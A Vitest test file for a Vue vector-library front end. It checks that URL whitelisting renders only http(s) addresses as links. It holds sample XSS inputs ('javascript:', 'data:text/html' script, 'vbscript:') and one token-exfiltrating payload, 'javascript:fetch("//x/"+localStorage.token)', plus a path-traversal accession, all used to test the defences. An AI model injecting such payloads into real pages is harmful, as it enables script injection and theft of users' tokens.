/**
 * 外链协议白名单（审查 01-M5 / 03-Low 1）：来自后端/第三方的 URL 只有 http(s) 才渲染成 <a>。
 */
import { describe, it, expect, vi, beforeEach } from 'vitest'
import { mount, flushPromises, type VueWrapper } from '@vue/test-utils'
import { nextTick } from 'vue'
import { createRouter, createMemoryHistory } from 'vue-router'
import { createPinia, setActivePinia } from 'pinia'
import pUC19 from './fixtures/map/pUC19.json'
import { safeHttpUrl } from '@/utils/safeUrl'

const mapApi = vi.hoisted(() => ({ getVectorMap: vi.fn(), getEnzymeSets: vi.fn() }))
vi.mock('@/map/api', async (orig) => ({ ...(await orig<typeof import('@/map/api')>()), ...mapApi }))
const api = vi.hoisted(() => ({ getVector: vi.fn(), getVectors: vi.fn(), getOnlineSources: vi.fn() }))
vi.mock('@/api', async (orig) => ({ ...(await orig<typeof import('@/api')>()), ...api }))

import VectorDetailView from '@/views/VectorDetailView.vue'
import VectorsView from '@/views/VectorsView.vue'

const BAD = ['javascript:alert(1)', ' JavaScript:alert(1)', 'data:text/html,<script>alert(1)</script>', 'vbscript:x', '//evil.example/x', '/relative', 'https//no-colon', '', null, 42]

describe('safeHttpUrl', () => {
  it('只放行 http(s) 绝对地址', () => {
    expect(safeHttpUrl('https://www.addgene.org/12345/')).toBe('https://www.addgene.org/12345/')
    expect(safeHttpUrl('  http://example.org/a?b=1 ')).toBe('http://example.org/a?b=1')
    expect(safeHttpUrl('HTTPS://EXAMPLE.ORG')).toBe('HTTPS://EXAMPLE.ORG')
    for (const b of BAD) expect(safeHttpUrl(b)).toBeNull()
  })
})

beforeEach(() => {
  vi.clearAllMocks()
  setActivePinia(createPinia())
  mapApi.getEnzymeSets.mockResolvedValue([])
})

async function mountDetail(url: string) {
  mapApi.getVectorMap.mockResolvedValue(pUC19)
  api.getVector.mockResolvedValue({
    id: 'v', name: 'v', vector_type: '', host: [], antibiotic_resistance: [], description: '', features: [], mcs_enzymes: [],
    source: 'common', copy_number: '', data_provenance: { source: 'from-map', url },
  })
  const r = createRouter({ history: createMemoryHistory(), routes: [
    { path: '/vectors/:id', component: VectorDetailView }, { path: '/:p(.*)*', component: { template: '<div/>' } },
  ] })
  r.push('/vectors/v')
  await r.isReady()
  const w = mount(VectorDetailView, { global: { plugins: [r] } })
  await flushPromises()
  return w
}

describe('载体详情页出处链接', () => {
  it('javascript: 出处按纯文本显示，不生成链接', async () => {
    const w = await mountDetail('javascript:fetch("//x/"+localStorage.token)')
    expect(w.find('.provenance').text()).toContain('javascript:')
    expect(w.find('.provenance a').exists()).toBe(false)
  })
  it('https 出处照常是链接', async () => {
    const w = await mountDetail('https://www.ncbi.nlm.nih.gov/nuccore/L09137')
    expect(w.find('.provenance a').attributes('href')).toBe('https://www.ncbi.nlm.nih.gov/nuccore/L09137')
  })
})

describe('载体库页第三方链接', () => {
  type S = Record<string, unknown>
  async function mountVectors() {
    api.getVectors.mockResolvedValue([])
    api.getOnlineSources.mockResolvedValue({ enabled: true, disclaimer: '', sources: [] })
    const w = mount(VectorsView, { global: { stubs: { RouterLink: true } } })
    await flushPromises()
    return { w, s: (w.vm as unknown as { $: { setupState: S } }).$.setupState }
  }
  const hrefs = (w: VueWrapper) => w.findAll('a').map((a) => a.attributes('href') ?? '')

  it('Addgene 元数据直链：只渲染 http(s)', async () => {
    const { w, s } = await mountVectors()
    s.activeTab = 'addgene'
    s.addgeneMeta = { plasmid_id: '1', note: '', metadata: { mapPngUrl: 'javascript:alert(1)', genbankUrl: 'https://media.addgene.org/x.gbk' } }
    await nextTick()
    expect(hrefs(w).some((h) => /^\s*javascript:/i.test(h))).toBe(false)
    expect(hrefs(w)).toContain('https://media.addgene.org/x.gbk')
    expect(w.text()).not.toContain('map.png ↗')
  })

  it('UniProt 交叉引用链接：只渲染 http(s)；登录号编码进路径', async () => {
    const { w, s } = await mountVectors()
    s.activeTab = 'uniprot'
    s.uniprotEntry = { accession: 'P0/../x', name: 'n', organism: 'o' }
    s.uniprotNucleotide = [
      { source: 'EMBL', label: 'bad', accession: 'X1', url: 'javascript:alert(1)' },
      { source: 'EMBL', label: 'good', accession: 'X2', url: 'https://www.ebi.ac.uk/ena/browser/view/X2' },
    ]
    await nextTick()
    const hs = hrefs(w)
    expect(hs.some((h) => /^\s*javascript:/i.test(h))).toBe(false)
    expect(hs).toContain('https://www.ebi.ac.uk/ena/browser/view/X2')
    expect(hs).toContain('https://www.uniprot.org/uniprotkb/P0%2F..%2Fx/entry')
  })
})
